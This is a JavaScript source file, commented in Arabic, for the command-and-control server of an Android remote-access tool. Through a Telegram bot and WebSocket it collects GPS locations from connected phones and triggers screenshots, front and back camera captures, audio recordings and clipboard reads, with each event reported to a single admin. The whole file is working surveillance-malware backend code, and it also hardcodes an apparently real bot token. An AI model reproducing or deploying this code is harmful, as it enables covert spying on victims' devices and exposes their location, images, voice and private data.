const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const WebSocket = require('ws');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// ==================== 🔐 الإعدادات ====================
const TELEGRAM_TOKEN = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const ADMIN_ID = '7604667042';
const SERVER_URL = 'https://your-app.onrender.com'; // غير هذا الرابط بعد النشر
// =====================================================

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const wss = new WebSocket.Server({ port: 8080 });

// حالة النظام
let systemStatus = {
    devices: new Map(),
    commands: new Map(),
    isActive: true
};

// إعداد Express
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ==================== 🌐 API Routes ====================

// 🔗 تسجيل الجهاز
app.post('/api/device/register', (req, res) => {
    try {
        const { deviceId, deviceInfo, ip } = req.body;
        
        const deviceData = {
            id: deviceId,
            info: deviceInfo,
            ip: ip,
            connected: true,
            lastSeen: new Date(),
            socket: null
        };
        
        systemStatus.devices.set(deviceId, deviceData);
        
        console.log(`📱 جهاز متصل: ${deviceId}`);
        notifyAdmin(`📱 **جهاز جديد متصل**\n📟 ${deviceInfo.model}\n🔋 ${deviceInfo.battery}%\n🤖 ${deviceInfo.android}`);
        
        res.json({ 
            success: true, 
            message: 'تم التسجيل بنجاح',
            serverTime: new Date().toISOString()
        });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📍 تحديث الموقع
app.post('/api/device/location', (req, res) => {
    try {
        const { deviceId, location } = req.body;
        
        const device = systemStatus.devices.get(deviceId);
        if (device) {
            device.location = location;
            device.lastSeen = new Date();
            
            console.log(`📍 موقع جديد من ${deviceId}:`, location);
            notifyAdmin(`📍 **موقع الجهاز**\n🌍 ${location.latitude}, ${location.longitude}\n🎯 ${location.accuracy}m`);
        }
        
        res.json({ success: true });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📸 رفع الملفات
app.post('/api/device/upload', (req, res) => {
    try {
        const { deviceId, fileType, data, timestamp } = req.body;
        
        console.log(`📁 ملف مستلم من ${deviceId}: ${fileType}`);
        
        // معالجة不同类型的 الملفات
        switch(fileType) {
            case 'screenshot':
                notifyAdmin('📸 **لقطة شاشة جديدة**\nتم استلام لقطة الشاشة من الجهاز');
                break;
            case 'camera_front':
                notifyAdmin('🤳 **صورة كاميرا أمامية**\nتم التقاط صورة بالكاميرا الأمامية');
                break;
            case 'camera_back':
                notifyAdmin('📷 **صورة كاميرا خلفية**\nتم التقاط صورة بالكاميرا الخلفية');
                break;
            case 'audio':
                notifyAdmin('🎙️ **تسجيل صوتي**\nتم استلام تسجيل صوتي جديد');
                break;
        }
        
        res.json({ success: true, received: true });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📡 معلومات الجهاز
app.post('/api/device/info', (req, res) => {
    try {
        const { deviceId, info } = req.body;
        
        const device = systemStatus.devices.get(deviceId);
        if (device) {
            device.info = { ...device.info, ...info };
            device.lastSeen = new Date();
        }
        
        res.json({ success: true });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🎯 إرسال أمر للجهاز
app.post('/api/command/send', async (req, res) => {
    try {
        const { deviceId, command, data } = req.body;
        
        const commandId = generateCommandId();
        const commandData = {
            id: commandId,
            deviceId: deviceId,
            command: command,
            data: data,
            timestamp: new Date(),
            status: 'pending'
        };
        
        systemStatus.commands.set(commandId, commandData);
        
        // إرسال الأمر عبر WebSocket إذا كان الجهاز متصل
        const device = systemStatus.devices.get(deviceId);
        if (device && device.socket) {
            device.socket.send(JSON.stringify({
                type: 'command',
                commandId: commandId,
                command: command,
                data: data
            }));
        }
        
        res.json({ 
            success: true, 
            commandId: commandId,
            message: 'تم إرسال الأمر'
        });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ==================== 🔗 WebSocket Connections ====================

wss.on('connection', (ws, req) => {
    console.log('🔗 اتصال WebSocket جديد');
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            handleWebSocketMessage(ws, data);
        } catch (error) {
            console.error('❌ خطأ في معالجة رسالة WebSocket:', error);
        }
    });
    
    ws.on('close', () => {
        console.log('🔌 انقطع اتصال WebSocket');
        // تحديث حالة الجهاز
        for (let [deviceId, device] of systemStatus.devices) {
            if (device.socket === ws) {
                device.connected = false;
                device.socket = null;
                notifyAdmin(`📱 **انقطع الاتصال**\nالجهاز: ${device.info.model}`);
            }
        }
    });
});

// ==================== 🤖 Telegram Bot Commands ====================

// 🏁 أمر البدء
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAuthorized(chatId)) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
    }
    
    const deviceCount = systemStatus.devices.size;
    
    const welcomeMsg = `
🤖 **نظام التحكم الكامل بالهاتف**  
👤 **المستخدم:** George96399  

📊 **حالة النظام:**
📱 الأجهزة المتصلة: ${deviceCount}
🟢 الحالة: نشط
🔗 السيرفر: ${SERVER_URL}

🎯 **الأوامر المتاحة:**
/status - حالة النظام
/devices - الأجهزة المتصلة  
/location - طلب الموقع
/screenshot - لقطة شاشة
/camera_front - كاميرا أمامية
/camera_back - كاميرا خلفية  
/record_audio - تسجيل صوت
/vibrate - اهتزاز الجهاز
/clipboard - الحافظة
    `;
    
    bot.sendMessage(chatId, welcomeMsg, { parse_mode: 'Markdown' });
});

// 📊 حالة النظام
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const deviceCount = systemStatus.devices.size;
    const activeDevices = Array.from(systemStatus.devices.values()).filter(d => d.connected).length;
    
    const statusMsg = `
📊 **حالة النظام التفصيلية**

📱 الأجهزة:
• الإجمالي: ${deviceCount}
• النشطة: ${activeDevices}
• غير النشطة: ${deviceCount - activeDevices}

🕒 وقت التشغيل: ${getUptime()}
🔗 السيرفر: ${SERVER_URL}
🟢 الحالة: ${systemStatus.isActive ? 'نشط' : 'متوقف'}
    `;
    
    bot.sendMessage(chatId, statusMsg, { parse_mode: 'Markdown' });
});

// 📱 الأجهزة المتصلة
bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    if (systemStatus.devices.size === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }
    
    let devicesList = '📱 **الأجهزة المتصلة:**\n\n';
    
    systemStatus.devices.forEach((device, deviceId) => {
        const status = device.connected ? '🟢' : '🔴';
        const lastSeen = device.lastSeen ? device.lastSeen.toLocaleTimeString() : 'غير معروف';
        
        devicesList += `${status} **${device.info.model || 'غير معروف'}**\n`;
        devicesList += `📟 ID: ${deviceId}\n`;
        devicesList += `🔋 البطارية: ${device.info.battery || 'غير معروف'}%\n`;
        devicesList += `🤖 الأندرويد: ${device.info.android || 'غير معروف'}\n`;
        devicesList += `🕒 آخر ظهور: ${lastSeen}\n\n`;
    });
    
    bot.sendMessage(chatId, devicesList, { parse_mode: 'Markdown' });
});

// 📍 طلب الموقع
bot.onText(/\/location/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const devices = getConnectedDevices();
    if (devices.length === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }
    
    // إرسال أمر الموقع لجميع الأجهزة المتصلة
    for (const device of devices) {
        await sendCommandToDevice(device.id, 'get_location', {});
    }
    
    bot.sendMessage(chatId, '📍 جاري طلب الموقع من الأجهزة المتصلة...');
});

// 📸 لقطة شاشة
bot.onText(/\/screenshot/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const devices = getConnectedDevices();
    if (devices.length === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }
    
    for (const device of devices) {
        await sendCommandToDevice(device.id, 'take_screenshot', {});
    }
    
    bot.sendMessage(chatId, '📸 جاري أخذ لقطات الشاشة من الأجهزة...');
});

// 🤳 كاميرا أمامية
bot.onText(/\/camera_front/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const devices = getConnectedDevices();
    if (devices.length === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }
    
    for (const device of devices) {
        await sendCommandToDevice(device.id, 'capture_camera', { camera: 'front' });
    }
    
    bot.sendMessage(chatId, '🤳 جاري التقاط الصور بالكاميرا الأمامية...');
});

// 📷 كاميرا خلفية
bot.onText(/\/camera_back/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const devices = getConnectedDevices();
    if (devices.length === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }
    
    for (const device of devices) {
        await sendCommandToDevice(device.id, 'capture_camera', { camera: 'back' });
    }
    
    bot.sendMessage(chatId, '📷 جاري التقاط الصور بالكاميرا الخلفية...');
});

// 🎙️ تسجيل صوت
bot.onText(/\/record_audio/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const devices = getConnectedDevices();
    if (devices.length === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }
    
    for (const device of devices) {
        await sendCommandToDevice(device.id, 'record_audio', { duration: 10 });
    }
    
    bot.sendMessage(chatId, '🎙️ جاري تسجيل الصوت لمدة 10 ثواني...');
});

// 📳 اهتزاز
bot.onText(/\/vibrate/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const devices = getConnectedDevices();
    if (devices.length === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }
    
    for (const device of devices) {
        await sendCommandToDevice(device.id, 'vibrate', { duration: 2000 });
    }
    
    bot.sendMessage(chatId, '📳 جاري تفعيل الاهتزاز لمدة 2 ثانية...');
});

// 📋 الحافظة
bot.onText(/\/clipboard/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(chatId)) return;
    
    const devices = getConnectedDevices();
    if (devices.length === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }
    
    for (const device of devices) {
        await sendCommandToDevice(device.id, 'get_clipboard', {});
    }
    
    bot.sendMessage(chatId, '📋 جاري الحصول على محتوى الحافظة...');
});

// ==================== 🛠️ دوال مساعدة ====================

// التحقق من الصلاحية
function isAuthorized(chatId) {
    return chatId.toString() === ADMIN_ID;
}

// إشعار المسؤول
function notifyAdmin(message) {
    bot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }).catch(console.error);
}

// إنشاء معرف أمر
function generateCommandId() {
    return 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// الحصول على الأجهزة المتصلة
function getConnectedDevices() {
    return Array.from(systemStatus.devices.values()).filter(device => device.connected);
}

// إرسال أمر للجهاز
async function sendCommandToDevice(deviceId, command, data) {
    try {
        const response = await axios.post(`${SERVER_URL}/api/command/send`, {
            deviceId: deviceId,
            command: command,
            data: data
        });
        
        return response.data;
    } catch (error) {
        console.error(`❌ خطأ في إرسال الأمر لـ ${deviceId}:`, error.message);
        return { success: false, error: error.message };
    }
}

// معالجة رسائل WebSocket
function handleWebSocketMessage(ws, data) {
    switch(data.type) {
        case 'device_register':
            handleDeviceRegistration(ws, data);
            break;
        case 'command_response':
            handleCommandResponse(data);
            break;
        case 'location_update':
            handleLocationUpdate(data);
            break;
        case 'file_upload':
            handleFileUpload(data);
            break;
    }
}

// تسجيل الجهاز عبر WebSocket
function handleDeviceRegistration(ws, data) {
    const { deviceId, deviceInfo } = data;
    
    const deviceData = {
        id: deviceId,
        info: deviceInfo,
        ip: ws._socket.remoteAddress,
        connected: true,
        lastSeen: new Date(),
        socket: ws
    };
    
    systemStatus.devices.set(deviceId, deviceData);
    console.log(`🔗 جهاز متصل عبر WebSocket: ${deviceId}`);
}

// معالجة استجابة الأمر
function handleCommandResponse(data) {
    const { commandId, success, result } = data;
    const command = systemStatus.commands.get(commandId);
    
    if (command) {
        command.status = success ? 'completed' : 'failed';
        command.result = result;
        command.completedAt = new Date();
        
        console.log(`✅ استجابة أمر ${commandId}: ${success ? 'ناجح' : 'فاشل'}`);
    }
}

// تحديث الموقع
function handleLocationUpdate(data) {
    const { deviceId, location } = data;
    const device = systemStatus.devices.get(deviceId);
    
    if (device) {
        device.location = location;
        device.lastSeen = new Date();
        
        notifyAdmin(`📍 **تحديث موقع**\n🌍 ${location.latitude}, ${location.longitude}\n📱 ${device.info.model}`);
    }
}

// معالجة رفع الملفات
function handleFileUpload(data) {
    const { deviceId, fileType, fileData } = data;
    console.log(`📁 ملف مستلم عبر WebSocket: ${fileType} من ${deviceId}`);
    
    // هنا يمكن معالجة وحفظ الملف
}

// وقت التشغيل
function getUptime() {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    
    return `${hours} س ${minutes} د ${seconds} ث`;
}

// ==================== 🌐 صفحة الويب ====================

app.get('/', (req, res) => {
    const deviceCount = systemStatus.devices.size;
    const activeDevices = Array.from(systemStatus.devices.values()).filter(d => d.connected).length;
    
    res.send(`
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحكم بالهاتف</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
        }
        .status-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .card {
            background: rgba(255,255,255,0.1);
            padding: 25px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        .devices-list {
            background: rgba(255,255,255,0.1);
            padding: 25px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            margin-bottom: 30px;
        }
        .device-item {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border-left: 4px solid #4CAF50;
        }
        .device-offline {
            border-left-color: #f44336;
        }
        .commands {
            background: rgba(255,255,255,0.1);
            padding: 25px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        .command-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 12px 20px;
            margin: 5px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }
        .command-btn:hover {
            background: #45a049;
        }
        .command-btn:disabled {
            background: #666;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🤖 نظام التحكم الكامل بالهاتف</h1>
            <p>👤 المستخدم: George96399 | 📞 الآيدي: ${ADMIN_ID}</p>
        </div>
        
        <div class="status-cards">
            <div class="card">
                <h3>📊 حالة النظام</h3>
                <p>🟢 الحالة: نشط</p>
                <p>📱 الأجهزة: ${deviceCount}</p>
                <p>🟢 النشطة: ${activeDevices}</p>
                <p>🔴 غير النشطة: ${deviceCount - activeDevices}</p>
            </div>
            <div class="card">
                <h3>🔗 معلومات السيرفر</h3>
                <p>🌐 الرابط: ${SERVER_URL}</p>
                <p>🕒 وقت التشغيل: ${getUptime()}</p>
                <p>📡 المنفذ: ${port}</p>
            </div>
        </div>
        
        <div class="devices-list">
            <h3>📱 الأجهزة المتصلة</h3>
            ${deviceCount === 0 ? 
                '<p>❌ لا توجد أجهزة متصلة</p>' : 
                Array.from(systemStatus.devices.values()).map(device => `
                    <div class="device-item ${device.connected ? '' : 'device-offline'}">
                        <strong>${device.info.model || 'غير معروف'}</strong>
                        <p>📟 ID: ${device.id}</p>
                        <p>🔋 البطارية: ${device.info.battery || 'غير معروف'}%</p>
                        <p>🤖 الأندرويد: ${device.info.android || 'غير معروف'}</p>
                        <p>🕒 آخر ظهور: ${device.lastSeen.toLocaleTimeString()}</p>
                        <p>🌐 IP: ${device.ip}</p>
                    </div>
                `).join('')
            }
        </div>
        
        <div class="commands">
            <h3>🎯 أوامر التحكم</h3>
            <p>استخدم بوت التلجرام للأوامر: /start</p>
            <div>
                <button class="command-btn" onclick="alert('استخدم بوت التلجرام للأوامر')">📍 الموقع</button>
                <button class="command-btn" onclick="alert('استخدم بوت التلجرام للأوامر')">📸 لقطة شاشة</button>
                <button class="command-btn" onclick="alert('استخدم بوت التلجرام للأوامر')">🤳 كاميرا أمامية</button>
                <button class="command-btn" onclick="alert('استخدم بوت التلجرام للأوامر')">📷 كاميرا خلفية</button>
                <button class="command-btn" onclick="alert('استخدم بوت التلجرام للأوامر')">🎙️ تسجيل صوت</button>
                <button class="command-btn" onclick="alert('استخدم بوت التلجرام للأوامر')">📳 اهتزاز</button>
            </div>
        </div>
    </div>
</body>
</html>
    `);
});

// ==================== 🚀 بدء التشغيل ====================

app.listen(port, () => {
    console.log('🚀 =================================');
    console.log('🤖 نظام التحكم الكامل بالهاتف');
    console.log('👤 المطور: George96399');
    console.log('📞 آيدي التلجرام:', ADMIN_ID);
    console.log('🔗 السيرفر شغال على port:', port);
    console.log('🔗 WebSocket على port: 8080');
    console.log('🌐 الرابط:', SERVER_URL);
    console.log('🚀 =================================');
    
    // إشعار بدء التشغيل
    notifyAdmin(
        '🚀 **تم تشغيل النظام بنجاح**\n\n' +
        `📅 الوقت: ${new Date().toLocaleString()}\n` +
        `🌐 السيرفر: ${SERVER_URL}\n` +
        `📡 الحالة: جاهز لاستقبال الأجهزة`
    );
});

// معالجة الأخطاء غير الملتقطة
process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير ملتقط:', error);
    notifyAdmin(`❌ **خطأ في النظام**\n${error.message}`);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ رفض وعد غير معالج:', reason);
    notifyAdmin(`❌ **رفض وعد في النظام**\n${reason}`);
});
